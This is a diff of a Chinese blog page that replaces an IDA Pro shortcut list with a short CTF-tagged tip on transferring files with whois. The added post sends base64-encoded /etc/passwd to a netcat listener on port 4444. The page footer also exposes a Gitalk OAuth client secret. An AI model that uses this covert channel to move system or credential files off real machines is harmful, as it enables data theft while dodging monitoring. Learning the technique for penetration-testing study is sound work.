@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>IDA Pro &mdash; 张建新</title>
+    <title>利用Whois传输小文件。 &mdash; 张建新</title>
       <!-- or -->
 
     <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
@@ -25,23 +25,23 @@
     
 
     
-    <link rel="canonical" href="https://firsh.me/wiki/ida-pro/">
+    <link rel="canonical" href="https://firsh.me/2019/09/02/use-whois-send-file-hack/">
     <link rel="alternate" type="application/atom+xml" title="张建新" href="/feed.xml">
     <link rel="shortcut icon" href="/favicon.ico">
     
-    <meta property="og:title" content="IDA Pro">
+    <meta property="og:title" content="利用Whois传输小文件。">
       
-    <meta name="keywords" content="debug, IDA Pro">
-    <meta name="og:keywords" content="debug, IDA Pro">
+    <meta name="keywords" content="whois 渗透">
+    <meta name="og:keywords" content="whois 渗透">
       
-    <meta name="description" content="快捷键">
-    <meta name="og:description" content="快捷键">
+    <meta name="description" content="Linux利用Whois传输文件。">
+    <meta name="og:description" content="Linux利用Whois传输文件。">
       
     
     
         
     
-    <meta property="og:url" content="https://firsh.me/wiki/ida-pro/">
+    <meta property="og:url" content="https://firsh.me/2019/09/02/use-whois-send-file-hack/">
     <meta property="og:site_name" content="张建新">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
@@ -97,12 +97,25 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="IDA Pro">
+    <section class="collection-head small geopattern" data-pattern-id="利用Whois传输小文件。">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">IDA Pro</h1>
+        <h1 class="collection-header">利用Whois传输小文件。</h1>
+        <div class="collection-info">
+          
+          <span class="meta-info">
+            <span class="octicon octicon-calendar"></span> 2019/09/02
+          </span>
+          
+          
+          <span class="meta-info">
+            <span class="octicon octicon-file-directory"></span>
+            <a href="/categories/#CTF" title="CTF">CTF</a>
+          </span>
+          
+        </div>
       </div>
     </div>
   </div>
@@ -113,46 +126,15 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <h3 id="快捷键">快捷键</h3>
+    <p>Linux利用Whois传输文件。</p>
 
-<p>C –&gt; Ctrl</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>传输机：
+root@john:~# whois <span class="nt">-h</span> 127.0.0.1 <span class="nt">-p</span> 4444 <span class="sb">`</span><span class="nb">cat</span> /etc/passwd | base64<span class="sb">`</span>
+接受机：
+root@john:/tmp# nc <span class="nt">-l</span> <span class="nt">-v</span> <span class="nt">-p</span> 4444 | sed <span class="s2">"s/ //g"</span> | base64 <span class="nt">-d</span>
+</code></pre></div></div>
 
-<p>S –&gt; Shift</p>
-
-<p>M –&gt; Alt</p>
-
-<p>Cmd –&gt; Command</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>功能</th>
-      <th>快捷键</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>搜索文本</td>
-      <td>M-t</td>
-    </tr>
-    <tr>
-      <td>返回上一个位置</td>
-      <td>Esc</td>
-    </tr>
-    <tr>
-      <td>前进到下一位置</td>
-      <td>C-Enter</td>
-    </tr>
-    <tr>
-      <td>显示伪 C 代码</td>
-      <td>F5</td>
-    </tr>
-    <tr>
-      <td>跳转到地址</td>
-      <td>g</td>
-    </tr>
-  </tbody>
-</table>
+<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
 
     </article>
     <div class="share">
@@ -166,7 +148,7 @@
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/wiki/ida-pro/',
+            id: '/2019/09/02/use-whois-send-file-hack/',
             clientID: '0dc80b46a482ec78f3e0',
             clientSecret: '8cae5d306b3703ad240b74142995473086fcbbab',
             repo: 'blog-comments',
